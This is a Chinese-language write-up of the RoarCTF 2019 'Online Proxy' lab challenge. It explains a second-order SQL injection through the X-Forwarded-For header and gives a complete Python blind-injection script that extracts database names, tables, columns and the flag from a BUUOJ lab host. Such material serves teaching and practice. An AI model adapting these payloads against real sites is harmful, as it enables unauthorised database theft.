# \[RoarCTF 2019]Online Proxy

## \[RoarCTF 2019]Online Proxy

## 考点

* 盲注
* 二次注入

## wp

直接输入参数 `?url=https://baidu.com/` 在请求包发现注释的 Current Ip\
在HTTP header加上X-Forwarded-For: 127.0.1.23发现这个IP写入了 Current Ip

```php
<?php
$last_ip = "";
$result = query("select current_ip, last_ip from ip_log where uu");
if(count($result) > 0) {
    if($ip !== $result[0]['current_ip']) {
        $last_ip = $result[0]['current_ip'];

        query("delete from ip_log where uu");
    } else {
        $last_ip = $result[0]['last_ip'];
    }
}

query("insert into ip_log values ('".addslashes($uuid)."', '".addslashes($ip)."', '$last_ip');");
die("\n<!-- Debug Info: \n Duration: $time s \n Current Ip: $ip ".($last_ip !== "" ? "\nLast Ip: ".$last_ip : "")." -->");
```

这里是一个二次注入，下面给出详细分析

根据已知信息，不难判断数据库中存在三个字段，分别是 current\_ip，last\_ip和uuid\
在初始情况下，last\_ip是空的\


![](https://i.loli.net/2020/08/03/6m4URSe9QAoq8Dv.jpg)

此时修改HTTP请求头为X-Forwarded-For: testtest，由于新输入的IP和数据库中保存的当前IP不同，所以会删除已存储的，然后经过addslashes()函数转义新的IP，再将新的IP和last\_ip插入\
如果相同，就会将数据库中存储的last\_ip赋值给变量，然后再转义进行插入。根据代码此时的ip应为testtest，last\_ip为174.0.0.2\
插入语句顺序如下

```
insert into table values ('x', '174.0.0.2', '');
insert into table values ('x', 'testtest', '174.0.0.2');
```

![](https://i.loli.net/2020/08/03/4ztd7UaeMlJRnsv.jpg)

假设输入为 X-Forwarded-For: 1' or '1，因为和已存储的current\_ip不同，所以会删除以前的内容，然后经过addslashes()函数转义，再存入数据库，存入数据库的内容为 `1' or '1` ，根据代码此时的ip应为`1' or '1`，last\_ip为testtest

```
insert into table values ('x', '1\' or \'1', 'testtest');
```

![](https://i.loli.net/2020/08/03/7OrFCv4domuYNs1.jpg)

然后输入X-Forwarded-For: 123456，因为和已存储的current\_ip不同，会把last\_ip赋值为`1' or '1` 然后删除，再插入。如下语句，很明显构成了注入，'1' or '1' 的结果为 1，所以最后结果为 1，但是这是插入之后last\_ip的值，根据代码，此时的ip应为123456，last\_ip为1' or '1

```
insert into table values ('x', '123456', '1' or '1');
```

![](https://i.loli.net/2020/08/03/UhyPX5FqZ9HNczj.jpg)

再输入X-Forwarded-For: 123456时，才会看到经过SQL运算之后的值\


![](https://i.loli.net/2020/08/03/ABT2wROylFKxLJh.jpg)

脚本如下

```python
import requests

url = 'http://node3.buuoj.cn:29612/?url=http://127.0.0.1/'

# ctf
def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0' or (ascii(substr((select database()),{i},1))>{mid}) or '0"

            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': payload
            }
            
            requests.get(url=url, headers=header)
            
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            requests.get(url=url, headers=header)
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            r = requests.get(url=url, headers=header)
            
            if 'Last Ip: 1' in r.text:
                low = mid + 1
            else:
                high = mid
            
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
                
# information_schema,ctf,F4l9_D4t4B45e
def get_all_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0' or (ascii(substr(reverse((select group_concat(schema_name) from information_schema.schemata)),{i},1))>{mid}) or '0"

            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': payload
            }
            
            requests.get(url=url, headers=header)
            
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            requests.get(url=url, headers=header)
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            r = requests.get(url=url, headers=header)
            
            if 'Last Ip: 1' in r.text:
                low = mid + 1
            else:
                high = mid
            
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
# F4l9_t4b1e
def get_table():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0' or (ascii(substr(((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e')),{i},1))>{mid}) or '0"

            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': payload
            }
            
            requests.get(url=url, headers=header)
            
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            requests.get(url=url, headers=header)
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            r = requests.get(url=url, headers=header)
            
            if 'Last Ip: 1' in r.text:
                low = mid + 1
            else:
                high = mid
            
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
                
# F4l9_C01uMn
def get_column():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0' or (ascii(substr(((select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e')),{i},1))>{mid}) or '0"

            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': payload
            }
            
            requests.get(url=url, headers=header)
            
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            requests.get(url=url, headers=header)
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            r = requests.get(url=url, headers=header)
            
            if 'Last Ip: 1' in r.text:
                low = mid + 1
            else:
                high = mid
            
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
                
# flag{0238f77f-f8af-457d-bc43-0224d4d98428}  
def get_flag():
    flag = ''
    for i in range(1, 100):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            # flag在另外一个数据库
            payload = f"0' or (ascii(substr(reverse((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e)),{i},1))>{mid}) or '0"

            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': payload
            }
            
            requests.get(url=url, headers=header)
            
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            requests.get(url=url, headers=header)
            header = {
                'Cookie': 'track_uuid=2a04ebb6-db29-4542-8183-4adb4e1fd008',
                'X-Forwarded-For': '123456'
            }
            r = requests.get(url=url, headers=header)
            
            if 'Last Ip: 1' in r.text:
                low = mid + 1
            else:
                high = mid
            
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_flag()
```
